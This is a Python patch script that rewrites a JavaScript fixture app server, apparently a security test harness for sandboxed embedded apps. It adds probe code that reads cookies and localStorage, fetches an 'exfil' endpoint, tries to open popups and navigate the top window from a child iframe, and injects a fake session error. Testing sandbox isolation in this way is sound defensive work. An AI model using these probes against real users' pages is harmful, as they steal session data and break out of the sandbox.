S = '$SCRATCH'
src = open(S + '/r3/harness/fixture-app-server.mjs').read()

def rep(old, new):
    global src
    assert old in src, old[:60]
    src = src.replace(old, new, 1)

rep("const SECRET = arg('--secret', 'SECRET-TOKEN-0000');",
"""const SECRET = arg('--secret', 'SECRET-TOKEN-0000');
const EXFIL = arg('--exfil', 'http://127.0.0.1:2');
const ALT_DAEMON = arg('--alt-daemon', DAEMON);
const INJECT_ONCE = arg('--inject-once', '');""")
rep('<button id="btn-unknown">no_such_tool</button>',
    '<button id="btn-unknown">no_such_tool</button><button id="btn-expiring">expiring_app_tool</button><button id="btn-stable">stable_app_tool</button>')
rep("window.__probes = probes; out('probes', probes);",
"""await tryIt('undeclaredOriginFetch', async () => { const r = await fetch('${EXFIL}/exfil-by-app?origin=' + encodeURIComponent(self.origin)); return 'HTTP ' + r.status; });
await tryIt('altDaemonCapabilities', async () => { const r = await fetch('${ALT_DAEMON}/capabilities'); return 'HTTP ' + r.status + ' ' + (await r.text()).slice(0, 60); });
await tryIt('altDaemonPostSession', async () => { const r = await fetch('${ALT_DAEMON}/session', { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{}' }); return 'HTTP ' + r.status; });
await tryIt('undeclaredImg', () => new Promise((res) => { const i = new Image(); i.onload = () => res('LOADED'); i.onerror = () => res('blocked/error'); i.src = '${EXFIL}/img-by-app.png'; setTimeout(() => res('timeout'), 4000); }));
await tryIt('cookieRead', () => 'cookie=' + JSON.stringify(document.cookie));
await tryIt('localStorageRead', () => 'keys=' + Object.keys(localStorage).join(','));
window.__probes = probes; out('probes', probes);""")
rep("window.__call = call;",
r"""window.__call = call;
window.__burst = (n) => { for (let i = 0; i < n; i++) call('get_embed_token', { view: 'burst-' + i }); };
window.__attack = () => {
  const r = {};
  try { window.top.location = '${VENDOR}/topnav-by-app'; r.topnav = 'assigned'; } catch (e) { r.topnav = e.name + ': ' + e.message; }
  try { const w = window.open('${VENDOR}/popup-by-app'); r.popup = w ? 'opened' : 'null'; } catch (e) { r.popup = e.name + ': ' + e.message; }
  try { const f = document.createElement('iframe'); f.srcdoc = '<script>try{top.location="${VENDOR}/topnav-by-child"}catch(e){}try{open("${VENDOR}/popup-by-child")}catch(e){}<\\/script>'; document.body.appendChild(f); r.child = 'appended'; } catch (e) { r.child = e.name; }
  window.__attackResult = r; return r;
};""")
rep("for (const [id, name] of [['btn-token','get_embed_token'],",
    "for (const [id, name] of [['btn-expiring','expiring_app_tool'],['btn-stable','stable_app_tool'],['btn-token','get_embed_token'],")
rep("server.registerResource(",
"""server.registerTool('expiring_app_tool', { description: 'App-only tool whose first call hits an upstream session error', inputSchema: {}, _meta: ui(['app']) },
  async () => { log({ ev: 'call', tool: 'expiring_app_tool' }); return { content: [{ type: 'text', text: 'expiring ok' }] }; });
server.registerTool('stable_app_tool', { description: 'App-only stable tool', inputSchema: {}, _meta: ui(['app']) },
  async () => { log({ ev: 'call', tool: 'stable_app_tool' }); return { content: [{ type: 'text', text: 'stable ok' }] }; });
server.registerResource(""")
rep("await server.connect(new StdioServerTransport());",
"""const transport = new StdioServerTransport();
await server.connect(transport);
// Request-level JSON-RPC error while the transport stays connected
// (the shape of an upstream "session not found" relayed by a stdio server).
const origOnMessage = transport.onmessage;
transport.onmessage = (msg, extra) => {
  if (INJECT_ONCE && msg?.method === 'tools/call' && msg.params?.name === 'expiring_app_tool' && !fs.existsSync(INJECT_ONCE)) {
    fs.writeFileSync(INJECT_ONCE, String(Date.now()));
    log({ ev: 'inject', tool: 'expiring_app_tool', error: 'Session not found' });
    void transport.send({ jsonrpc: '2.0', id: msg.id, error: { code: -32001, message: 'Session not found' } });
    return;
  }
  origOnMessage(msg, extra);
};""")
open(S + '/r4/harness/fixture-app-server.mjs', 'w').write(src)
print('ok')
